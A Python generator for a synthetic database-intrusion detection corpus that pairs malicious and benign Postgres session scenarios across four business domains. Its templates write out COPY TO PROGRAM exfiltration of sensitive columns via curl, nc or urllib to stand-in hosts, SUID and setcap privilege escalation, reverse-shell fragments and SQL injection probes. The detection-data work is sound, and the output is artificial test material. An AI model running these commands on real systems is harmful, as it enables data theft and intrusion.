#!/usr/bin/env python3
"""
generate.py — deterministic, template-driven scenario generator for scaling
the CASCE synthetic corpus without near-duplicates.

Design (see the datagen/scale/README.md and the chat design):
- A scenario is a point in a parameter space: domain x category x technique
  x role x structure x class x timing, with literals drawn from large seeded
  pools. Volume comes from sampling this space, not from re-authoring a few
  skeletons.
- Duplicates are prevented by (1) a structural fingerprint with a per-
  fingerprint cap, (2) a legitimacy matrix that keeps benign scenarios role-
  appropriate and guarantees every primitive appears in BOTH classes, and
  (3) class/matched-pair quotas.
- Output is spec YAML only; the unchanged codegen.py + validate_run.py remain
  the gate. Families and matched pairs are confined to one run directory.

Usage:
  python datagen/scale/generate.py --target 500 --out datagen/generated/gen
  python datagen/scale/generate.py --target 500 --out datagen/generated/gen --seed 7
Then run codegen + validate per emitted run dir (run_wave.sh does this).
"""
from __future__ import annotations
import argparse
import random
import shutil
from collections import Counter, defaultdict
from pathlib import Path

import yaml

# ── Domain specs (must stay consistent with datagen/domains/*.yaml) ────────
DOMAINS = {
    "banking": {
        "etl_role": "batch_etl_service",
        "sensitive_read_role": "compliance_officer",
        "app_roles": ["teller", "branch_manager"],
        "priv_role": "teller",
        "sensitive": {"customers": ["national_id", "address"], "accounts": ["balance"]},
        "nonsensitive": {"accounts": ["account_id", "account_type"],
                          "transactions": ["transaction_id", "amount", "counterparty"],
                          "customers": ["customer_id", "full_name"]},
        "scope_col": ("branch_id", ["BR-011", "BR-014", "BR-021", "BR-033", "BR-047", "BR-052"]),
        "id_col": ("customer_id", (10000, 79999)),
        "tamper": [("accounts", "balance"), ("transactions", "amount")],
        "insert_table": "transactions",
    },
    "healthcare": {
        "etl_role": "research_etl_service",
        "sensitive_read_role": "him_officer",
        "app_roles": ["nurse", "physician", "billing_clerk"],
        "priv_role": "nurse",
        "sensitive": {"patients": ["ssn", "date_of_birth", "address", "phone"],
                       "medical_records": ["diagnosis_notes", "diagnosis_code"],
                       "prescriptions": ["drug_name", "dosage"]},
        "nonsensitive": {"appointments": ["appointment_id", "status"],
                          "doctors": ["doctor_id", "specialty"],
                          "billing": ["invoice_id", "payment_status"]},
        "scope_col": ("department_id", [1, 3, 5, 7, 9, 11]),
        "id_col": ("patient_id", (10000, 79999)),
        "tamper": [("prescriptions", "dosage"), ("billing", "amount")],
        "insert_table": "prescriptions",
    },
    "ecommerce": {
        "etl_role": "analytics_etl_service",
        "sensitive_read_role": "fraud_analyst",
        "app_roles": ["support_agent", "catalog_manager", "payments_service"],
        "priv_role": "support_agent",
        "sensitive": {"payments": ["card_token", "card_last4"],
                       "customers": ["email", "phone", "shipping_address"]},
        "nonsensitive": {"orders": ["order_id", "status", "total_amount"],
                          "products": ["product_id", "name", "category"],
                          "order_items": ["order_item_id", "quantity"]},
        "scope_col": ("status", ["pending", "shipped", "flagged", "delivered"]),
        "id_col": ("order_id", (80000, 99999)),
        "tamper": [("payments", "amount"), ("orders", "status")],
        "insert_table": "payments",
    },
    "logistics": {
        "etl_role": "partner_etl_service",
        "sensitive_read_role": "compliance_auditor",
        "app_roles": ["dispatcher", "warehouse_clerk", "fleet_manager"],
        "priv_role": "dispatcher",
        "sensitive": {"drivers": ["license_number", "phone", "home_address"],
                       "shipments": ["dest_address"], "manifests": ["declared_value"]},
        "nonsensitive": {"vehicles": ["vehicle_id", "plate_number"],
                          "warehouses": ["warehouse_id", "name"],
                          "shipments": ["shipment_id", "status"]},
        "scope_col": ("depot_id", ["DP-02", "DP-05", "DP-07", "DP-11", "DP-14"]),
        "id_col": ("shipment_id", (50000, 69999)),
        "tamper": [("shipments", "dest_address"), ("manifests", "declared_value")],
        "insert_table": "shipments",
    },
}

CATEGORIES = {
    "copy_to_program": ["curl", "gzip_curl", "python_urllib", "nc"],
    "os_priv_escalation": ["suid_cp", "setcap", "sudo_gtfobins", "cron_persist"],
    "reverse_shell": ["bash", "python", "sh", "perl"],
    "sql_injection": ["union", "boolean_blind", "stacked", "error_based"],
    # malicious extras that keep DDL/DML verbs from being one-class artifacts
    "data_tamper": ["update", "insert", "create_role", "truncate"],
}
ATTACK_CATEGORIES = ["copy_to_program", "os_priv_escalation", "reverse_shell", "sql_injection"]
BENIGN_KINDS = ["sensitive_audit", "union_report", "legit_etl", "legit_routine", "legit_dml"]

MATCH_DIMS = {
    "copy_to_program": {"fixed": ["process_tree_shape", "syscall_sequence", "timing_pattern", "role"], "varied": ["sql_content"]},
    "sql_injection":   {"fixed": ["process_tree_shape", "syscall_sequence", "timing_pattern", "role"], "varied": ["sql_content"]},
    "os_priv_escalation": {"fixed": ["syscall_sequence", "timing_pattern", "role"], "varied": ["process_tree_shape"]},
    "reverse_shell":   {"fixed": ["process_tree_shape", "syscall_sequence", "timing_pattern", "role"], "varied": ["connects_to_destination"]},
}


# ── Seeded literal pools ───────────────────────────────────────────────────
class Pools:
    def __init__(self, rng: random.Random):
        self.rng = rng
        self.attacker_ips = [f"{a}.{rng.randint(0,255)}.{rng.randint(1,254)}"
                             for a in ["45.77", "185.220.101", "91.219.236", "141.98.11",
                                       "193.42.33", "194.147.78", "176.65.48", "23.129.64"]
                             for _ in range(60)]
        self.internal_ips = [f"10.{rng.randint(0,80)}.{rng.randint(0,40)}.{rng.randint(2,254)}" for _ in range(200)] + \
                            [f"192.168.{rng.randint(0,50)}.{rng.randint(2,254)}" for _ in range(80)]
        self.doc_ext_ips = [f"203.0.113.{rng.randint(2,254)}" for _ in range(60)] + \
                           [f"198.51.100.{rng.randint(2,254)}" for _ in range(60)]
        self.exfil_ports = [443, 8443, 8080, 9001, 9443]
        self.c2_ports = [4444, 5555, 6666, 4445, 1337, 9002]
        self.pivot_ports = [22, 445, 3389, 5432, 23]
        self.collector_ports = [9100, 9200, 9101, 443]
        self.ext_hosts = ["sync.partner-mirror.example", "warehouse-sync.datasink.example",
                          "analytics-mirror.datasink.example", "customs-sync.datasink.example",
                          "deid-partner.example", "clearinghouse-batch.example"]
        self.int_hosts = ["etl-internal.corp", "audit-intake.corp", "warehouse.corp", "reports.corp"]
        self.tmp_names = [".rootbash", ".rootdash", ".svc_helper", ".dbmaint", ".pyroot",
                          ".hisvc", ".svc_backup", ".svclink", ".dbroot", ".dpbash"]
        self.legit_scripts = ["pg_maintenance.sh", "backup_rotate.sh", "vacuum_nightly.sh",
                              "healthcheck.sh", "wal_archive.sh", "depot_maintenance.sh",
                              "index_rebuild.sh", "metrics_agent.sh"]
        self.times_night = [f"{h:02d}:{m:02d}" for h in [0,1,2,3,4,22,23] for m in (5,20,35,50)]
        self.times_day = [f"{h:02d}:{m:02d}" for h in range(9,18) for m in (10,40)]

    def pick(self, seq):
        return self.rng.choice(seq)


def _rid(rng, lo=1000, hi=999999):
    return rng.randint(lo, hi)


# ── Event helpers ──────────────────────────────────────────────────────────
def ev_sql(step_id, sql, connects_to=None):
    e = {"step_id": step_id, "sql": sql}
    if connects_to:
        e["connects_to"] = {"ip": connects_to[0], "port": connects_to[1]}
    return e

def ev_proc(step_id, comm, args, parent=None):
    p = {"step_id": step_id, "process": {"comm": comm, "args": [str(a) for a in args]}}
    if parent:
        p["process"]["parent"] = parent
    return p

def ev_file(path, syscall, parent, step_id=None):
    e = {"file": {"path": path, "syscall": syscall, "parent": parent}}
    if step_id:
        e = {"step_id": step_id, "file": {"path": path, "syscall": syscall, "parent": parent}}
    return e

def ev_conn(ip, port, parent):
    return {"connect": {"ip": ip, "port": int(port), "parent": parent}}


def _timing(pools, tempo=None):
    tempo = tempo or pools.pick(["bursty", "steady"])
    if tempo == "bursty":
        gaps = [pools.pick([0.5, 1.0, 1.5])]
    elif tempo == "off_hours":
        gaps = [pools.pick([2.0, 5.0])]
    else:
        gaps = [pools.pick([3.0, 5.0, 8.0])]
    return {"tempo": tempo, "step_gaps_seconds": gaps}


def _copy_shell(pools, technique, host, path=None):
    """Return a v1-simple COPY TO PROGRAM shell string for the technique."""
    url = f"https://{host}/ingest"
    if technique == "curl":
        return f"curl -sX POST {url} -d @-"
    if technique == "gzip_curl":
        return f"gzip | curl -sX POST {url} --data-binary @-"
    if technique == "python_urllib":
        return (f'python3 -c "import urllib.request,sys; '
                f'urllib.request.urlopen(urllib.request.Request(\\"{url}\\", '
                f'data=sys.stdin.buffer.read(), method=\\"POST\\"))"')
    if technique == "nc":
        return f"nc {host} 443"
    if technique == "local_cat":
        return f"cat > {path}"
    if technique == "local_gzip":
        return f"gzip > {path}"
    return f"curl -sX POST {url} -d @-"


# ── Template builders ─────────────────────────────────────────────────────
def build_copy_to_program(dom, spec, pools, technique, cls, sid, role):
    """COPY (SELECT ...) TO PROGRAM '<exfil cmd>'. cls selects data breadth + destination."""
    st = spec["scope_col"]
    if cls == "malicious":
        table = pools.pick(list(spec["sensitive"].keys()))
        cols = ", ".join(spec["sensitive"][table])
        sql_sel = f"SELECT {cols} FROM {table}"
        # destination: attacker external OR internal pivot (overlap the ranges)
        if pools.rng.random() < 0.4:
            ip, port = pools.pick(pools.internal_ips), pools.pick(pools.pivot_ports + pools.exfil_ports)
            host = pools.pick(pools.int_hosts)
        else:
            ip, port = pools.pick(pools.attacker_ips), pools.pick(pools.exfil_ports)
            host = pools.pick(pools.ext_hosts)
        rule = "malicious_false_negative"
    else:
        table = pools.pick(list(spec["nonsensitive"].keys()))
        cols = ", ".join(spec["nonsensitive"][table][:2])
        sql_sel = f"SELECT {cols} FROM {table} WHERE {st[0]} = '{pools.pick(st[1])}'"
        # benign etl to documented endpoint: external OR internal (overlap)
        if pools.rng.random() < 0.5:
            ip, port = pools.pick(pools.doc_ext_ips), pools.pick(pools.exfil_ports)
            host = pools.pick(pools.ext_hosts)
        else:
            ip, port = pools.pick(pools.internal_ips), pools.pick(pools.exfil_ports)
            host = pools.pick(pools.int_hosts)
        rule = pools.pick(["agrees", "benign_false_positive"])
    shell = _copy_shell(pools, technique, host)
    sql = f"COPY ({sql_sel}) TO PROGRAM '{shell}'"
    ct = (ip, port) if technique in ("curl", "gzip_curl", "python_urllib", "nc") else None
    sess = {"session_label": "exfil", "role": role, "anchor": "db",
            "timing": _timing(pools, "steady"),
            "events": [ev_sql("dump", sql, ct)]}
    return [sess], rule


def build_sql_injection(dom, spec, pools, technique, cls, sid, role):
    st = spec["scope_col"]
    idc = spec["id_col"]
    stab = pools.pick(list(spec["sensitive"].keys()))
    scols = ", ".join(spec["sensitive"][stab])
    ntab = pools.pick(list(spec["nonsensitive"].keys()))
    ncols = ", ".join(spec["nonsensitive"][ntab][:2])
    host = pools.pick(pools.ext_hosts) if cls == "malicious" else pools.pick(pools.ext_hosts + pools.int_hosts)
    if cls == "malicious":
        ip, port = pools.pick(pools.attacker_ips), pools.pick(pools.exfil_ports)
        if technique == "union":
            probe = f"SELECT {ncols} FROM {ntab} WHERE {idc[0]} = 0 UNION SELECT {scols} FROM {stab}"
        elif technique == "boolean_blind":
            probe = f"SELECT {ncols} FROM {ntab} WHERE {idc[0]} = {_rid(pools.rng)} AND (SELECT count(*) FROM {stab}) > 0"
        elif technique == "error_based":
            probe = f"SELECT {ncols} FROM {ntab} WHERE {idc[0]} = CAST((SELECT {spec['sensitive'][stab][0]} FROM {stab} LIMIT 1) AS INTEGER)"
        else:  # stacked -> model as separate probe select then exfil (multi-statement unsafe in one sql)
            probe = f"SELECT {scols} FROM {stab} WHERE {idc[0]} > {_rid(pools.rng)}"
        exfil = f"COPY (SELECT {scols} FROM {stab}) TO PROGRAM '{_copy_shell(pools, 'curl', host)}'"
        events = [ev_sql("probe", probe), ev_sql("exfil", exfil, (ip, port))]
        rule = "malicious_false_negative"
    else:
        ip, port = (pools.pick(pools.doc_ext_ips), pools.pick(pools.exfil_ports))
        probe = f"SELECT {ncols} FROM {ntab} WHERE {idc[0]} = {pools.rng.randint(*idc[1])}"
        exfil = f"COPY (SELECT {ncols} FROM {ntab} WHERE {st[0]} = '{pools.pick(st[1])}') TO PROGRAM '{_copy_shell(pools, 'curl', pools.pick(pools.ext_hosts))}'"
        events = [ev_sql("probe", probe), ev_sql("exfil", exfil, (ip, port))]
        rule = pools.pick(["agrees", "benign_false_positive"])
    sess = {"session_label": "inject", "role": role, "anchor": "db",
            "timing": _timing(pools, "steady"), "events": events}
    return [sess], rule


def build_os_priv_escalation(dom, spec, pools, technique, cls, sid, role):
    if cls == "malicious":
        target = "/tmp/" + pools.pick(pools.tmp_names)
        if technique == "suid_cp":
            evs = [ev_proc("cp", "cp", ["/bin/bash", target]),
                   ev_proc("suid", "chmod", ["u+s", target], parent="cp"),
                   ev_proc("run", target, ["-p", "-c", "id"], parent="suid")]
        elif technique == "setcap":
            evs = [ev_proc("cp", "cp", ["/usr/bin/python3", target]),
                   ev_proc("suid", "setcap", ["cap_setuid+ep", target], parent="cp"),
                   ev_proc("run", target, ["-c", "import os; os.setuid(0)"], parent="suid")]
        elif technique == "sudo_gtfobins":
            evs = [ev_proc("enum", "sudo", ["-l"]),
                   ev_proc("cp", "cp", ["/bin/sh", target], parent="enum"),
                   ev_proc("run", target, ["-p"], parent="cp")]
        else:  # cron_persist
            evs = [ev_proc("cp", "cp", ["/bin/bash", target]),
                   ev_proc("suid", "chmod", ["4755", target], parent="cp"),
                   ev_proc("persist", "crontab", ["-l"], parent="suid")]
        rule = "agrees"
    else:
        script = "/tmp/" + pools.pick(pools.legit_scripts)
        src = pools.pick(["/usr/local/bin/", "/opt/pg/bin/"]) + pools.pick(pools.legit_scripts)
        evs = [ev_proc("cp", "cp", [src, script]),
               ev_proc("perm", "chmod", ["u+x", script], parent="cp"),
               ev_proc("run", script, [pools.pick(["--vacuum", "--rotate", "--check"])], parent="perm")]
        rule = pools.pick(["agrees", "benign_false_positive"])
    sess = {"session_label": "escalate", "role": role, "anchor": "synthetic",
            "anchor_query": "SELECT 1", "timing": _timing(pools, "bursty"), "events": evs}
    return [sess], rule


def build_reverse_shell(dom, spec, pools, technique, cls, sid, role):
    comm = {"bash": "bash", "python": "python3", "sh": "sh", "perl": "perl"}[technique]
    if cls == "malicious":
        ip, port = pools.pick(pools.attacker_ips), pools.pick(pools.c2_ports)
        args = {"bash": ["-i"], "sh": ["-i"],
                "python": ["-c", "import socket,subprocess,os; s=socket.socket(); s.connect(('c2',1))"],
                "perl": ["-e", "use Socket; socket(S,PF_INET,SOCK_STREAM,0);"]}[technique]
        rule = "agrees"
    else:
        ip, port = pools.pick(pools.internal_ips), pools.pick(pools.collector_ports)
        script = "/usr/local/bin/" + pools.pick(pools.legit_scripts)
        args = [script]
        rule = pools.pick(["agrees", "benign_false_positive"])
    evs = [ev_proc("spawn", comm, args), ev_conn(ip, port, "spawn")]
    sess = {"session_label": "revshell", "role": role, "anchor": "synthetic",
            "anchor_query": "SELECT 1", "timing": _timing(pools, "bursty"), "events": evs}
    return [sess], rule


def build_data_tamper(dom, spec, pools, technique, cls, sid, role):
    """Malicious DML/DDL with OS-layer follow-on (keeps UPDATE/INSERT/DDL in malicious)."""
    host = pools.pick(pools.ext_hosts)
    ip, port = pools.pick(pools.attacker_ips + pools.internal_ips), pools.pick(pools.exfil_ports + pools.pivot_ports)
    if technique == "update":
        t, c = pools.pick(spec["tamper"])
        sql = f"UPDATE {t} SET {c} = {_rid(pools.rng)} WHERE {spec['id_col'][0]} = {pools.rng.randint(*spec['id_col'][1])}"
    elif technique == "insert":
        t = spec["insert_table"]
        sql = f"INSERT INTO {t} DEFAULT VALUES"
    elif technique == "create_role":
        sql = f"CREATE ROLE svc_{_rid(pools.rng)} SUPERUSER LOGIN PASSWORD 'x{_rid(pools.rng)}'"
    else:  # truncate
        t = pools.pick([x[0] for x in spec["tamper"]])
        sql = f"TRUNCATE TABLE {t}"
    # OS-layer follow-on: dump via COPY TO PROGRAM (curl) OR explicit process+connect
    if pools.rng.random() < 0.5:
        dump = f"COPY (SELECT 1) TO PROGRAM '{_copy_shell(pools, 'curl', host)}'"
        events = [ev_sql("act", sql), ev_sql("dump", dump, (ip, port))]
    else:
        events = [ev_sql("act", sql),
                  ev_proc("stage", pools.pick(["bash", "python3"]), ["-c", "stage"], parent="act"),
                  ev_conn(ip, port, "stage")]
    sess = {"session_label": "tamper", "role": role, "anchor": "db",
            "timing": _timing(pools, "bursty"), "events": events}
    return [sess], "malicious_false_negative"


# benign routines
def build_sensitive_audit(dom, spec, pools, sid):
    """Benign: the sensitive-read role reads sensitive tables -> local audit log (no egress)."""
    role = spec["sensitive_read_role"]
    table = pools.pick(list(spec["sensitive"].keys()))
    cols = ", ".join(spec["sensitive"][table])
    path = f"/var/log/audit/{dom}_{_rid(pools.rng)}.log"
    tech = pools.pick(["local_cat", "local_gzip"])
    sql = f"COPY (SELECT {cols} FROM {table}) TO PROGRAM '{_copy_shell(pools, tech, None, path)}'"
    sess = {"session_label": "audit", "role": role, "anchor": "db",
            "timing": _timing(pools, "steady"), "events": [ev_sql("read", sql)]}
    return [sess], pools.pick(["agrees", "benign_false_positive"])


def build_union_report(dom, spec, pools, sid):
    """Benign: legitimate UNION report + OS-layer report generation (keeps UNION in benign)."""
    role = pools.pick([spec["sensitive_read_role"]] + spec["app_roles"])
    st = spec["scope_col"]
    ntab = pools.pick(list(spec["nonsensitive"].keys()))
    cols = ", ".join(spec["nonsensitive"][ntab][:2])
    a, b = pools.pick(st[1]), pools.pick(st[1])
    sql = (f"SELECT {cols} FROM {ntab} WHERE {st[0]} = '{a}' "
           f"UNION SELECT {cols} FROM {ntab} WHERE {st[0]} = '{b}'") if isinstance(a, str) else \
          (f"SELECT {cols} FROM {ntab} WHERE {st[0]} = {a} "
           f"UNION SELECT {cols} FROM {ntab} WHERE {st[0]} = {b}")
    rpt = f"/var/reports/{dom}_{_rid(pools.rng)}.csv"
    events = [ev_sql("report", sql),
              ev_proc("gen", pools.pick(["python3", "bash"]), ["report_gen"], parent="report"),
              ev_file(rpt, "openat", "gen")]
    sess = {"session_label": "reporting", "role": role, "anchor": "db",
            "timing": _timing(pools, "steady"), "events": events}
    return [sess], pools.pick(["agrees", "benign_false_positive"])


def build_legit_etl(dom, spec, pools, sid):
    role = spec["etl_role"]
    st = spec["scope_col"]
    ntab = pools.pick(list(spec["nonsensitive"].keys()))
    cols = ", ".join(spec["nonsensitive"][ntab][:2])
    host = pools.pick(pools.ext_hosts + pools.int_hosts)
    ip = pools.pick(pools.doc_ext_ips if host in pools.ext_hosts else pools.internal_ips)
    port = pools.pick(pools.exfil_ports)
    tech = pools.pick(["curl", "gzip_curl", "python_urllib"])
    sql = f"COPY (SELECT {cols} FROM {ntab} WHERE {st[0]} = '{pools.pick(st[1])}') TO PROGRAM '{_copy_shell(pools, tech, host)}'"
    sess = {"session_label": "etl", "role": role, "anchor": "db",
            "timing": _timing(pools, "steady"), "events": [ev_sql("sync", sql, (ip, port))]}
    return [sess], pools.pick(["agrees", "benign_false_positive"])


def build_legit_routine(dom, spec, pools, sid):
    """Benign app-role routine: scoped read/update + a small OS-layer step."""
    role = pools.pick(spec["app_roles"])
    st = spec["scope_col"]
    ntab = pools.pick(list(spec["nonsensitive"].keys()))
    cols = ", ".join(spec["nonsensitive"][ntab][:2])
    val = pools.pick(st[1])
    where = f"{st[0]} = '{val}'" if isinstance(val, str) else f"{st[0]} = {val}"
    sql = f"SELECT {cols} FROM {ntab} WHERE {where}"
    ip, port = pools.pick(pools.internal_ips), pools.pick(pools.collector_ports)
    events = [ev_sql("op", sql),
              ev_proc("notify", pools.pick(["curl", "bash", "python3"]), ["notify"], parent="op"),
              ev_conn(ip, port, "notify")]
    sess = {"session_label": "routine", "role": role, "anchor": "db",
            "timing": _timing(pools, pools.pick(["steady", "bursty"])), "events": events}
    return [sess], "agrees"


def build_legit_dml(dom, spec, pools, sid):
    """Benign role-appropriate UPDATE/INSERT (keeps DML verbs in BOTH classes) + OS-layer notify."""
    role = pools.pick(spec["app_roles"])
    st = spec["scope_col"]
    val = pools.pick(st[1])
    where = f"{st[0]} = '{val}'" if isinstance(val, str) else f"{st[0]} = {val}"
    if pools.rng.random() < 0.5:
        ntab = pools.pick(list(spec["nonsensitive"].keys()))
        setcol = spec["nonsensitive"][ntab][-1]
        sql = f"UPDATE {ntab} SET {setcol} = '{pools.rng.randint(1,999)}' WHERE {where}"
    else:
        sql = f"INSERT INTO {spec['insert_table']} DEFAULT VALUES"
    ip, port = pools.pick(pools.internal_ips), pools.pick(pools.collector_ports)
    events = [ev_sql("op", sql),
              ev_proc("notify", pools.pick(["curl", "bash", "python3"]), ["notify"], parent="op"),
              ev_conn(ip, port, "notify")]
    sess = {"session_label": "dml", "role": role, "anchor": "db",
            "timing": _timing(pools, pools.pick(["steady", "bursty"])), "events": events}
    return [sess], pools.pick(["agrees", "benign_false_positive"])


ATTACK_BUILDERS = {
    "copy_to_program": build_copy_to_program,
    "sql_injection": build_sql_injection,
    "os_priv_escalation": build_os_priv_escalation,
    "reverse_shell": build_reverse_shell,
    "data_tamper": build_data_tamper,
}


# ── Fingerprint (structural, literals stripped) ────────────────────────────
def _table_class(spec, name):
    if name in spec["sensitive"]:
        return "S"
    return "N"

def content_key(scn):
    """Full-content key INCLUDING literals — two scenarios with the same key are
    true duplicates (same role, SQL, processes, files, endpoints). Used to
    guarantee zero exact duplicates even when seeded pools collide."""
    import hashlib
    parts = [scn["domain"]]
    for s in scn["sessions"]:
        parts.append(s.get("role", "") + ":" + s.get("anchor", "db"))
        for ev in s["events"]:
            if "sql" in ev:
                parts.append("SQL:" + ev["sql"])
            elif "process" in ev:
                parts.append("P:" + ev["process"]["comm"] + " " + " ".join(ev["process"]["args"]))
            elif "file" in ev:
                parts.append("F:" + ev["file"]["syscall"] + ev["file"]["path"])
            elif "connect" in ev:
                parts.append("C:%s:%s" % (ev["connect"]["ip"], ev["connect"]["port"]))
            if "connects_to" in ev:
                parts.append("CT:%s:%s" % (ev["connects_to"]["ip"], ev["connects_to"]["port"]))
    return hashlib.sha1("||".join(parts).encode()).hexdigest()


def fingerprint(scenario, spec):
    parts = []
    for sess in scenario["sessions"]:
        toks = [sess.get("anchor", "db"), sess.get("role", "")]
        for ev in sess["events"]:
            if "sql" in ev:
                s = ev["sql"].upper()
                verb = s.strip().split(None, 1)[0]
                prog = "PROG" if "TO PROGRAM" in s else ""
                uni = "UNION" if "UNION" in s else ""
                # crude table-class detection
                tc = ""
                for t in spec["sensitive"]:
                    if t.upper() in s:
                        tc += "S"
                for t in spec["nonsensitive"]:
                    if t.upper() in s:
                        tc += "N"
                toks.append(f"sql:{verb}{prog}{uni}:{tc}")
            elif "process" in ev:
                comm = ev["process"]["comm"]
                cc = "tmp" if comm.startswith("/tmp") else comm.split("/")[-1]
                toks.append(f"proc:{cc}")
            elif "file" in ev:
                toks.append(f"file:{ev['file']['syscall']}")
            elif "connect" in ev:
                toks.append("conn")
            if "connects_to" in ev:
                toks.append("ct")
        parts.append("|".join(toks))
    return "//".join(parts)


# ── Planner ────────────────────────────────────────────────────────────────
def make_scenario(dom, spec, pools, cls, category, technique, kind, idx, run_id,
                  pair_id=None, family_id=None):
    role = None
    if category in ("copy_to_program", "sql_injection"):
        role = spec["etl_role"]
    elif category in ("os_priv_escalation", "reverse_shell"):
        role = "postgres"
    elif category == "data_tamper":
        role = pools.pick([spec["priv_role"], "postgres"])
    if cls == "malicious" and category in ATTACK_BUILDERS:
        sessions, rule = ATTACK_BUILDERS[category](dom, spec, pools, technique, cls, idx, role)
    elif cls == "benign" and category in ("copy_to_program", "sql_injection"):
        sessions, rule = ATTACK_BUILDERS[category](dom, spec, pools, technique, cls, idx, role)
    elif cls == "benign" and category in ("os_priv_escalation", "reverse_shell"):
        sessions, rule = ATTACK_BUILDERS[category](dom, spec, pools, technique, cls, idx, role)
    else:
        # benign routine kinds
        builder = {"sensitive_audit": build_sensitive_audit, "union_report": build_union_report,
                   "legit_etl": build_legit_etl, "legit_routine": build_legit_routine,
                   "legit_dml": build_legit_dml}[kind]
        sessions, rule = builder(dom, spec, pools, idx)
        role = sessions[0]["role"]
    tag = category if category else kind
    scenario = {
        "scenario_id": f"{run_id}_{tag}_{cls[:3]}_{idx}",
        "family_id": family_id or f"{run_id}_{tag}_{cls[:3]}_fam{idx}",
        "domain": dom,
        "time_of_day": pools.pick(pools.times_night if cls == "malicious" else pools.times_night + pools.times_day),
        "default_class": cls,
        "rule_engine_relationship": rule,
        "sessions": sessions,
    }
    if pair_id:
        scenario["matched_pair_id"] = pair_id
        scenario["matched_dimensions"] = MATCH_DIMS[category]
    return scenario


def generate(target, out_root, seed, per_run=20, fp_cap=6,
             match_frac=0.45, mal_frac=0.45):
    root_rng = random.Random(seed)
    out_root = Path(out_root)
    scenarios = []                 # list of (scenario, fingerprint, run_id)
    fp_counts = Counter()
    seen_content = set()           # full-content keys -> guarantees zero exact duplicates
    per_domain = target // len(DOMAINS)
    doms = list(DOMAINS.items())

    def accept(scn, spec, run_id):
        ck = content_key(scn)
        if ck in seen_content:
            return False
        fp = fingerprint(scn, spec)
        if fp_counts[fp] >= fp_cap:
            return False
        fp_counts[fp] += 1
        seen_content.add(ck)
        scenarios.append((scn, fp, run_id))
        return True

    for dom, spec in doms:
        made = 0
        idx = 0
        attempts = 0
        # a per-domain pool seeded distinctly
        while made < per_domain and attempts < per_domain * 40:
            attempts += 1
            pools = Pools(random.Random(root_rng.random()))
            run_id = f"gen_{dom}_{(made // per_run):02d}"
            idx += 1
            roll = pools.rng.random()
            if roll < match_frac:
                # matched pair from an attack category
                cat = pools.pick(ATTACK_CATEGORIES)
                tech = pools.pick(CATEGORIES[cat])
                pid = f"{run_id}_{cat}_pair_{idx}"
                fam = f"{run_id}_{cat}_fam_{idx}"
                mal = make_scenario(dom, spec, pools, "malicious", cat, tech, None, f"{idx}m", run_id, pid, fam)
                ben = make_scenario(dom, spec, pools, "benign", cat, tech, None, f"{idx}b", run_id, pid, fam)
                # twins must share timing (timing_pattern is a fixed dimension for every
                # attack category); copy the malicious half's timing onto the benign half.
                for ms, bs in zip(mal["sessions"], ben["sessions"]):
                    bs["timing"] = {k: (list(v) if isinstance(v, list) else v)
                                    for k, v in ms["timing"].items()}
                # matched pairs bypass the structural fp cap (deliberately structurally-paired),
                # but still must not be exact-content duplicates of anything already emitted.
                ckm, ckb = content_key(mal), content_key(ben)
                if ckm in seen_content or ckb in seen_content or ckm == ckb:
                    continue
                seen_content.add(ckm); seen_content.add(ckb)
                scenarios.append((mal, fingerprint(mal, spec), run_id)); fp_counts[fingerprint(mal, spec)] += 1
                scenarios.append((ben, fingerprint(ben, spec), run_id)); fp_counts[fingerprint(ben, spec)] += 1
                made += 2
            elif pools.rng.random() < mal_frac:
                cat = pools.pick(ATTACK_CATEGORIES + ["data_tamper"])
                tech = pools.pick(CATEGORIES[cat])
                scn = make_scenario(dom, spec, pools, "malicious", cat, tech, None, f"{idx}", run_id)
                if accept(scn, spec, run_id):
                    made += 1
            else:
                kind = pools.pick(BENIGN_KINDS)
                scn = make_scenario(dom, spec, pools, "benign", None, None, kind, f"{idx}", run_id)
                if accept(scn, spec, run_id):
                    made += 1

    # write to run dirs (family/pair confined: run_id encodes the grouping)
    by_run = defaultdict(list)
    for scn, fp, run_id in scenarios:
        by_run[run_id].append(scn)
    if out_root.exists():
        shutil.rmtree(out_root)
    for run_id, scns in by_run.items():
        specs_dir = out_root / run_id / "specs"
        specs_dir.mkdir(parents=True, exist_ok=True)
        for scn in scns:
            (specs_dir / f"{scn['scenario_id']}.yaml").write_text(
                yaml.safe_dump(scn, sort_keys=False, default_flow_style=False))
    total = len(scenarios)
    n_mal = sum(1 for s, _, _ in scenarios if s["default_class"] == "malicious")
    print(f"Generated {total} scenarios ({n_mal} malicious / {total-n_mal} benign) "
          f"across {len(by_run)} run dirs → {out_root}")
    print(f"Distinct fingerprints: {len(fp_counts)} (cap {fp_cap}); "
          f"max per-fp: {max(fp_counts.values())}")
    return list(by_run.keys())


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", type=int, default=500)
    ap.add_argument("--out", default="datagen/generated/gen")
    ap.add_argument("--seed", type=int, default=1337)
    ap.add_argument("--per-run", type=int, default=20)
    ap.add_argument("--fp-cap", type=int, default=6)
    args = ap.parse_args()
    runs = generate(args.target, args.out, args.seed, per_run=args.per_run, fp_cap=args.fp_cap)
    print("run dirs:", " ".join(runs))


if __name__ == "__main__":
    main()
